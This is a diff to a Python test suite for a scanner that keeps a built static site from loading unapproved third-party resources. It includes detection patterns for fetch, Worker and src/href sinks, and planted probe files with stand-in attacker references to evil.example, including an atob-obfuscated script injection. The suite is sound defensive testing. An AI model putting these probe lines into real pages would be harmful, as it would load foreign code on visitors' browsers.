@@ -2000,21 +2000,39 @@ _URL_LITERAL = re.compile(
 #: full URL in a comment is still reported. That is the stricter reading and
 #: the real tree is clean of it: a second analytics endpoint parked in a
 #: comment is something a reviewer should see, and an endpoint is never prose.
+#:
+#: The ``//`` form's lookbehind excludes a QUOTE as well as a colon, and the
+#: quote is the half that matters. With ``(?<!:)`` alone, ``src="//host/x"``
+#: had the ``//`` preceded by the quote, so the whole reference was blanked
+#: as a comment — and :data:`_ABSOLUTE_TARGET` needs ``https?://`` and could
+#: not see it either. The consequence was measured, not theoretical: both
+#: ``<script src="//evil.example/t.js">`` and
+#: ``url("//evil.example/f.woff2")`` were SILENT PASSES on a copy of the
+#: clean counted site, and :func:`classify`'s whole ``//`` branch plus
+#: :data:`_URL_LITERAL`'s protocol-relative alternative were unreachable. A
+#: silent pass is the one thing :func:`scan_site` is built not to have
+#: (ADR-0039/R2's default-deny condition), so the stripper may not eat a
+#: reference a quote has already declared to be one.
 _COMMENTS = (
     re.compile(r"/\*.*?\*/", re.DOTALL),
     re.compile(r"<!--.*?-->", re.DOTALL),
-    re.compile(r"(?<!:)//[^\n]*"),
+    re.compile(r"""(?<![:"'`])//[^\n]*"""),
 )
 
 
 def _without_comments(text: str) -> str:
     """``text`` with the :data:`_COMMENTS` forms blanked, newlines preserved.
 
-    A heuristic, declared as one: the ``//`` form keeps ``://`` out with a
-    lookbehind, so an absolute URL inside a string survives, but a string
-    whose content held a bare ``//`` would be truncated. Nothing in the
-    served tree has one, and the cost of a false strip is a missed reference
-    inside a string — which the unstripped absolute pass still reads.
+    A heuristic, declared as one: the ``//`` form keeps ``://`` and a
+    quote-led ``//`` out with a lookbehind, so neither an absolute URL inside
+    a string nor a protocol-relative reference a quote introduces is
+    stripped. What remains is the residual cost: a comment whose ``//``
+    directly follows a quote character — ``const s = "a"// note`` — is not
+    recognised as a comment and survives into the quoted passes. That is the
+    safe direction (a comment that is read as code can only produce a
+    finding, never hide one), nothing in the served tree has one, and
+    ``test_no_homegrown_tracking``'s comment-stripping controls hold both
+    halves of what this exemption may and may not absorb (ADR-0039/R3).
     """
     for pattern in _COMMENTS:
         text = pattern.sub(lambda match: "\n" * match.group(0).count("\n"), text)
@@ -2028,7 +2046,30 @@ def _without_comments(text: str) -> str:
 #: target the scanner cannot read is a FAILURE, so the resolution only has to
 #: be sound, not complete, and ``test_no_homegrown_tracking``'s third control
 #: is a ``fetch`` whose target it cannot read.
-URL_CALLS = ("fetch", "importScripts", "sendBeacon", "WebSocket", "EventSource")
+URL_CALLS = (
+    "fetch",
+    "importScripts",
+    "sendBeacon",
+    "WebSocket",
+    "EventSource",
+    "Worker",
+    "SharedWorker",
+)
+
+#: A property assignment whose value IS a request target. The pattern set
+#: above reads references out of markup, CSS and import specifiers; a target
+#: a script assigns at runtime is reached by none of them, and three such
+#: shapes were measured as silent passes: ``el.src = atob(…)``,
+#: ``new Image().src = …`` and (through :data:`URL_CALLS` above)
+#: ``new Worker(…)``. A sink assignment whose value this scan cannot read is
+#: therefore a FAILURE like any other unreadable target, and one it can read
+#: is classified like any other reference. The tree's own single use is
+#: ``pages.js``' ``tile.href = `/play/${entry.key}` `` — a template hole in a
+#: rooted path, which resolves through ``vercel.json``'s rewrite exactly as
+#: the same literal already did.
+_PROPERTY_SINK = re.compile(
+    r"""\.\s*(src|srcset|srcdoc|href|action|formaction)\s*=(?![=>])\s*([^\n]*)"""
+)
 
 #: Shapes that mean the site handles — or reaches for — a visitor's IP or a
 #: per-visitor identifier (ADR-0041/R6, G-3).
@@ -2101,10 +2142,12 @@ def _assignments(text: str, name: str) -> tuple[list[str], int]:
     return literals, total
 
 
-def scan_site(site_dir: Path, allow: dict[str, str]) -> dict[str, list[str]]:
+def scan_site(
+    site_dir: Path, runtime: dict[str, str], static: dict[str, str]
+) -> dict[str, list[str]]:
     """AC-392's scan of an assembled site. Three buckets, all of them failures.
 
-    ``foreign`` is an external reference ``allow`` does not name.
+    ``foreign`` is an external reference the deploy page does not name.
     ``identifiers`` is an :data:`IDENTIFIER_SHAPES` hit. ``unclassifiable``
     is the bucket that makes the other two mean anything: a reference shape
     this scanner found and could not place — a relative path, an empty
@@ -2114,15 +2157,40 @@ def scan_site(site_dir: Path, allow: dict[str, str]) -> dict[str, list[str]]:
     one property a denylist-shaped guard cannot have and this one is built
     around.
 
-    ``allow`` is passed in rather than read here so that a control can REMOVE
-    a member and watch the scan catch what the member was permitting
+    **The deploy page's two blocks stay two blocks all the way through.**
+    ``runtime`` is what a visitor's browser may fetch; ``static`` is the
+    references the page declares as fetched by nobody at page load (today
+    ``vercel.json``'s ``$schema``). A ``static`` URL is permitted only where
+    this scan cannot tell whether anything fetches it — a bare URL in text, a
+    quoted literal — and is a FINDING in a fetching position: ``src=``,
+    ``href=``, a CSS ``url()``, an import specifier, a :data:`URL_CALLS`
+    target, a :data:`_PROPERTY_SINK` assignment. Unioning the two blocks at
+    the door, which is what this function used to do, made "non-runtime,
+    nothing fetches it" documentary only: a live
+    ``<script src="…/vercel.json">`` planted in the site scanned clean.
+
+    Both are passed in rather than read here so that a control can REMOVE a
+    member and watch the scan catch what the member was permitting
     (ADR-0039/R1): caught without it, missed with it.
+
+    **The bound, stated here because this is where a reader meets the
+    claim.** This is a lexical, single-file, one-hop scan over a known set of
+    reference shapes. It is default-deny WITHIN that set — a shape it finds
+    and cannot place is a failure — and it is silent about a sink shape that
+    is not in the set at all: a fetch reached through an alias, a target
+    assembled by string arithmetic in an inner scope, markup built by
+    ``document.write``. What closes ADR-0041/R6 is therefore not this scan
+    alone but this scan plus the browser-observed request closure
+    CARD-283/284 already hold (every request held to method, origin AND
+    path). The scan's job is to make a NEW egress impossible to add quietly;
+    the browser tests are what observe the egress that exists.
 
     The rewrites come from the tree's own ``vercel.json`` (ADR-0039/R2), so
     ``/play/<key>`` resolves for the same reason the deployed host resolves
     it and not because this function knows the route.
     """
-    permitted = tuple(sorted(allow.values()))
+    fetchable = tuple(sorted(set(runtime.values())))
+    permitted = tuple(sorted({*runtime.values(), *static.values()}))
     files = {
         path.relative_to(site_dir).as_posix()
         for path in site_dir.rglob("*")
@@ -2138,7 +2206,7 @@ def scan_site(site_dir: Path, allow: dict[str, str]) -> dict[str, list[str]]:
 
     found: dict[str, list[str]] = {"foreign": [], "identifiers": [], "unclassifiable": []}
 
-    def classify(where: str, raw: str) -> None:
+    def classify(where: str, raw: str, *, fetching: bool) -> None:
         target = raw.strip()
         if not target:
             found["unclassifiable"].append(f"{where}: an empty reference")
@@ -2147,8 +2215,17 @@ def scan_site(site_dir: Path, allow: dict[str, str]) -> dict[str, list[str]]:
             return
         if target.startswith(("http://", "https://", "//")):
             absolute = target if not target.startswith("//") else f"https:{target}"
-            if not any(absolute.startswith(url) for url in permitted):
-                found["foreign"].append(f"{where}: {target}")
+            allowed = fetchable if fetching else permitted
+            if not any(absolute.startswith(url) for url in allowed):
+                declared = any(absolute.startswith(url) for url in permitted)
+                found["foreign"].append(
+                    f"{where}: {target}"
+                    + (
+                        " is on the non-runtime allow-list and this position fetches it"
+                        if declared
+                        else ""
+                    )
+                )
             return
         if not target.startswith("/"):
             found["unclassifiable"].append(
@@ -2178,11 +2255,30 @@ def scan_site(site_dir: Path, allow: dict[str, str]) -> dict[str, list[str]]:
         for shape in IDENTIFIER_SHAPES:
             for hit in re.finditer(shape, text, re.IGNORECASE):
                 found["identifiers"].append(f"{relative}: {hit.group(0)!r} ({shape})")
+        # A bare URL in the raw text and a quoted literal say nothing about
+        # who fetches them; the markup, CSS and import shapes do.
         for match in _ABSOLUTE_TARGET.finditer(raw):
-            classify(relative, match.group(0))
-        for pattern in (_ATTR_TARGET, _IMPORT_TARGET, _CSS_TARGET, _URL_LITERAL):
+            classify(relative, match.group(0), fetching=False)
+        for match in _URL_LITERAL.finditer(text):
+            classify(relative, match.group(2), fetching=False)
+        for pattern in (_ATTR_TARGET, _IMPORT_TARGET, _CSS_TARGET):
             for match in pattern.finditer(text):
-                classify(relative, match.group(2))
+                classify(relative, match.group(2), fetching=True)
+        for match in _PROPERTY_SINK.finditer(text):
+            prop, rhs = match.group(1), match.group(2).strip()
+            if rhs[:1] in ('"', "'", "`"):
+                end = rhs.find(rhs[0], 1)
+                if end == -1:
+                    found["unclassifiable"].append(
+                        f"{relative}: .{prop} = opens a literal that does not close"
+                    )
+                else:
+                    classify(f"{relative} [.{prop} =]", rhs[1:end], fetching=True)
+                continue
+            found["unclassifiable"].append(
+                f"{relative}: .{prop} = {rhs[:40]!r} assigns a request target "
+                f"this scan cannot read"
+            )
         for name in URL_CALLS:
             for match in re.finditer(rf"\b{name}\s*\(\s*", text):
                 rest = text[match.end() :]
@@ -2193,7 +2289,7 @@ def scan_site(site_dir: Path, allow: dict[str, str]) -> dict[str, list[str]]:
                             f"{relative}: {name}( opens a literal that does not close"
                         )
                     else:
-                        classify(f"{relative} [{name}]", rest[1:end])
+                        classify(f"{relative} [{name}]", rest[1:end], fetching=True)
                     continue
                 word = re.match(r"([A-Za-z_$][A-Za-z0-9_$]*)\s*[,)]", rest)
                 if word is None:
@@ -2210,7 +2306,9 @@ def scan_site(site_dir: Path, allow: dict[str, str]) -> dict[str, list[str]]:
                     )
                     continue
                 for value in literals:
-                    classify(f"{relative} [{name} via {word.group(1)}]", value)
+                    classify(
+                        f"{relative} [{name} via {word.group(1)}]", value, fetching=True
+                    )
 
     # Deduplicated: one reference is read by more than one pattern on
     # purpose — a counting tag is both an absolute URL in the raw text and a
@@ -2421,7 +2519,7 @@ def test_assembled_site_is_self_contained(browser_page, pages_bundle, tmp_path) 
 
     # (4b) self-containment: every reference resolves inside the tree, or is
     # on the deploy page's allow-list, or the scan fails.
-    found = scan_site(out, {**ALLOW_RUNTIME, **ALLOW_STATIC})
+    found = scan_site(out, ALLOW_RUNTIME, ALLOW_STATIC)
     assert found == {"foreign": [], "identifiers": [], "unclassifiable": []}, found
     # The instrument is reached: a tree with a dangling reference is caught,
     # so "no dangling reference" is a measurement and not an empty scan.
@@ -2431,12 +2529,31 @@ def test_assembled_site_is_self_contained(browser_page, pages_bundle, tmp_path) 
         ),
         encoding="utf-8",
     )
-    assert scan_site(out, {**ALLOW_RUNTIME, **ALLOW_STATIC})["unclassifiable"], (
+    assert scan_site(out, ALLOW_RUNTIME, ALLOW_STATIC)["unclassifiable"], (
         "a reference to a file the tree does not hold was not noticed"
     )
 
     # (4c) a plain file server over the helper's tree, and the three doors.
-    # The counted tree is the one served, so these are the deployed pages.
+    # The counted tree is the one served, so these are the deployed pages —
+    # and the analytics hosts are aborted at the network layer, the same two
+    # lines AC-391 uses, with the hosts derived from the deploy page's own
+    # endpoints rather than typed here. Without the interceptor this journey
+    # made three LIVE third-party requests per run (measured: 19 requests,
+    # one non-same-origin host, three HTTP 200s every run). Three reasons,
+    # and any one is enough: `docs/deploy/player.md`'s own drift rule is
+    # "Do not count locally", so counted local traffic is a defect this
+    # suite would be producing; a suite that reaches a vendor depends on
+    # that vendor being up and on an undocumented localhost policy; and the
+    # request is the exact cross-origin shape CARD-283/284's four
+    # same-origin controls forbid, re-introduced from the test side.
+    hosts = sorted({value.split("/")[2] for value in ALLOW_RUNTIME.values()})
+    aborted: list[str] = []
+
+    def kill(route):
+        aborted.append(route.request.url)
+        route.abort()
+
+    page.route(re.compile("|".join(re.escape(host) for host in hosts)), kill)
     url, stop = _serve(direct.site_dir)
     try:
         _open_pages(page, url, f"/b/{slug}")
@@ -2448,6 +2565,12 @@ def test_assembled_site_is_self_contained(browser_page, pages_bundle, tmp_path) 
         assert _state(page, 0, 0) == "filled"
     finally:
         stop()
+    # The interceptor is reached rather than decorative, and it caught only
+    # the hosts it was derived from: a run that intercepted nothing would
+    # mean either the counted tag never reached the page or the journey
+    # reached the vendor anyway.
+    assert aborted, "nothing was intercepted, so the counted pages asked for nothing"
+    assert all(any(host in request for host in hosts) for request in aborted), aborted
 
 
 @pytest.mark.browser
@@ -2469,7 +2592,15 @@ def test_pages_work_with_analytics_blocked(browser_page, counted_host, pages_sit
     the blocked requests themselves. A blocked ``<script src>`` does make
     Chromium log a resource failure, and calling that "an uncaught error"
     would make the assertion unkeepable, so the exemption is exactly the
-    aborted URLs and is checked against them rather than waved at.
+    allow-listed HOSTS, and it is checked against them rather than waved at:
+    a console error is excused when either its text or its reported location
+    names one of those hosts. **Text OR location, not location alone** —
+    earlier prose on this card (and the brief that drove it) said "exempts
+    by the located URL", which is not what the predicate does. The location
+    is why the pair is recorded at all, because Chromium's text for an
+    aborted subresource names no URL; the disjunction is what keeps the
+    exemption from depending on which of the two Chromium happens to fill
+    in for a given failure mode.
 
     The interceptor is also proved: a run in which nothing was blocked would
     satisfy every assertion below while measuring the ordinary page, so the
@@ -2545,7 +2676,7 @@ def test_pages_work_with_analytics_blocked(browser_page, counted_host, pages_sit
     assert plain.counted == (), plain.counted
 
 
-def test_no_homegrown_tracking(counted_site, tmp_path) -> None:
+def test_no_homegrown_tracking(counted_site, tmp_path, monkeypatch) -> None:
     """AC-392 / ADR-0041/R6 — the scan, and the controls that can fail it.
 
     The scan is :func:`scan_site`, and what it is derived from matters more
@@ -2571,9 +2702,8 @@ def test_no_homegrown_tracking(counted_site, tmp_path) -> None:
     """
     report, keys, slug = counted_site
     site = report.site_dir
-    allow = {**ALLOW_RUNTIME, **ALLOW_STATIC}
 
-    assert scan_site(site, allow) == {
+    assert scan_site(site, ALLOW_RUNTIME, ALLOW_STATIC) == {
         "foreign": [],
         "identifiers": [],
         "unclassifiable": [],
@@ -2589,8 +2719,8 @@ def test_no_homegrown_tracking(counted_site, tmp_path) -> None:
     assert referenced == len(report.counted) >= 3, (referenced, report.counted)
 
     # Control 1 (ADR-0039/R1): the allow-list member is what permits it.
-    without = {name: url for name, url in allow.items() if name != "count"}
-    caught = scan_site(site, without)
+    without = {name: url for name, url in ALLOW_RUNTIME.items() if name != "count"}
+    caught = scan_site(site, without, ALLOW_STATIC)
     assert len(caught["foreign"]) == len(report.counted), caught["foreign"]
     assert all(ALLOW_RUNTIME["count"] in hit for hit in caught["foreign"]), caught
     assert sorted(hit.split(":", 1)[0] for hit in caught["foreign"]) == sorted(
@@ -2624,7 +2754,44 @@ def test_no_homegrown_tracking(counted_site, tmp_path) -> None:
         "</head><body></body></html>\n",
         encoding="utf-8",
     )
-    planted = scan_site(probed, allow)
+    # 5-9: the shapes that were silent passes before the fix round, each
+    # planted as the reviewer measured it.
+    static_url = sorted(ALLOW_STATIC.values())[0]
+    (probed / "probe-protocol-relative.html").write_text(
+        '<!doctype html><html><head><title>p</title>'
+        '<script src="//evil.example/t.js"></script>'
+        "</head><body></body></html>\n",
+        encoding="utf-8",
+    )
+    (probed / "probe-protocol-relative.css").write_text(
+        '@font-face{font-family:x;src:url("//evil.example/f.woff2")}\n',
+        encoding="utf-8",
+    )
+    (probed / "probe-worker.js").write_text(
+        'const worker = new Worker("//evil.example/w.js");\n',
+        encoding="utf-8",
+    )
+    (probed / "probe-sink.js").write_text(
+        'const el = document.createElement("script");\n'
+        'el.src = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvdC5qcw==");\n'
+        "document.head.append(el);\n",
+        encoding="utf-8",
+    )
+    (probed / "probe-nonruntime-fetched.html").write_text(
+        '<!doctype html><html><head><title>p</title>'
+        f'<script src="{static_url}"></script>'
+        "</head><body></body></html>\n",
+        encoding="utf-8",
+    )
+    (probed / "probe-trailing-comment.js").write_text(
+        'await fetch("/gone-from-this-tree.json"); // a trailing note\n',
+        encoding="utf-8",
+    )
+    (probed / "probe-exempt-comment.js").write_text(
+        "// the panel loads this one as await import('/not-in-this-tree.js')\n",
+        encoding="utf-8",
+    )
+    planted = scan_site(probed, ALLOW_RUNTIME, ALLOW_STATIC)
 
     # 2 — a second analytics endpoint, which is AC-392's own wording.
     assert [hit for hit in planted["foreign"] if "stats.example.net" in hit], planted
@@ -2638,6 +2805,69 @@ def test_no_homegrown_tracking(counted_site, tmp_path) -> None:
     # 4 — the two unclassifiable shapes, each named.
     assert [hit for hit in planted["unclassifiable"] if "probe-unreadable.js" in hit], planted
     assert [hit for hit in planted["unclassifiable"] if "probe-dangling.html" in hit], planted
+
+    # 5 — protocol-relative references, in markup and in CSS. Both of these
+    # were SILENT PASSES until the comment stripper stopped treating a
+    # quote-led `//` as a comment: the quote precedes the slashes, so the
+    # whole reference was blanked, and `_ABSOLUTE_TARGET` wants `https?://`
+    # and never saw it. They are the controls that make `classify`'s `//`
+    # branch and `_URL_LITERAL`'s protocol-relative alternative reachable
+    # code rather than decoration.
+    assert [
+        hit for hit in planted["foreign"] if "probe-protocol-relative.html" in hit
+    ], planted
+    assert [
+        hit for hit in planted["foreign"] if "probe-protocol-relative.css" in hit
+    ], planted
+    # 6 — the two runtime sinks the pattern set did not reach (F-005):
+    # `new Worker(...)` reads its target like any other URL call, and a
+    # `.src =` whose value is computed is unreadable and therefore a failure.
+    assert [hit for hit in planted["foreign"] if "probe-worker.js" in hit], planted
+    assert [
+        hit for hit in planted["unclassifiable"] if "probe-sink.js" in hit
+    ], planted
+    # 7 — the non-runtime allow-list is not a licence to fetch (F-006). The
+    # same URL the clean scan above accepts inside `vercel.json` is a finding
+    # in a `src=`, which is what makes "nothing fetches it at page load" an
+    # assertion instead of a sentence on the deploy page.
+    assert [
+        hit for hit in planted["foreign"] if "probe-nonruntime-fetched.html" in hit
+    ], planted
+    assert [hit for hit in planted["foreign"] if static_url in hit], planted
+    # ...and the static entry is what permits the real one (ADR-0039/R1 for
+    # the second block): with that block empty, `vercel.json`'s own `$schema`
+    # becomes a finding, caught WITHOUT the member and missed WITH it.
+    bare = scan_site(site, ALLOW_RUNTIME, {})
+    assert [hit for hit in bare["foreign"] if static_url in hit], bare
+    assert all("vercel.json" in hit for hit in bare["foreign"]), bare
+
+    # 8 (ADR-0039/R3) — what the comment-stripping exemption may NOT absorb,
+    # and what it may. An exemption is a claim, so both directions are here:
+    #
+    # * a live reference that merely SHARES A LINE with a comment survives
+    #   the strip and is still classified;
+    # * a reference that is genuinely inside a comment is exempted — and
+    #   that exemption is reached rather than vacuous, because with
+    #   `_COMMENTS` emptied the same plant is caught. That is the pair
+    #   ADR-0039/R3 asks for: missed with the exemption in place, caught
+    #   with it removed.
+    assert [
+        hit for hit in planted["unclassifiable"] if "probe-trailing-comment.js" in hit
+    ], planted
+    assert [
+        hit
+        for bucket in planted.values()
+        for hit in bucket
+        if "probe-exempt-comment.js" in hit
+    ] == [], planted
+    monkeypatch.setattr(sys.modules[__name__], "_COMMENTS", ())
+    unstripped = scan_site(probed, ALLOW_RUNTIME, ALLOW_STATIC)
+    assert [
+        hit
+        for hit in unstripped["unclassifiable"]
+        if "probe-exempt-comment.js" in hit
+    ], unstripped
+    monkeypatch.undo()
 
     # And the vocabulary is compound rather than bare, which is a measured
     # requirement and not a style: the tree's own grid fingerprints would
@@ -2780,8 +3010,19 @@ def test_the_deploy_page_is_the_only_place_that_holds_an_endpoint() -> None:
     An allow-list with a second copy is not an allow-list: the scan would
     hold the site to one of them while a deploy used the other. The two
     endpoints therefore appear in exactly one tracked file, and the search is
-    ``git grep`` over the whole tracked tree rather than over a directory
-    somebody remembered to include.
+    ``git grep`` over the tracked tree rather than over a directory somebody
+    remembered to include.
+
+    **``meta/`` is excluded, and that exclusion is part of the assertion
+    rather than a hole in it.** What must not hold a second copy is a file the
+    site or the tooling READS: another page, a player source, a script, a
+    test. ``meta/`` is this board's bookkeeping — cards and review reports
+    that QUOTE an endpoint while describing it, and that nothing reads as
+    configuration. Without the exclusion this test is a landmine aimed at the
+    board that owns it: review reports sync into ``main``, so the next
+    cycle's own report would red the suite the moment it quoted the URL it
+    was reviewing. Measured rather than imagined — cycle 1's reviewer had to
+    write its whole report around this test.
 
     The counted site is where they appear next, and that tree is not tracked
     — which is the shape this card wanted: the pages in ``player/`` carry no
@@ -2790,7 +3031,7 @@ def test_the_deploy_page_is_the_only_place_that_holds_an_endpoint() -> None:
     """
     for name, url in sorted(ALLOW_RUNTIME.items()):
         found = subprocess.run(
-            ["git", "grep", "-l", "--fixed-strings", url],
+            ["git", "grep", "-l", "--fixed-strings", url, "--", ":!meta"],
             capture_output=True,
             text=True,
             cwd=REPO_ROOT,
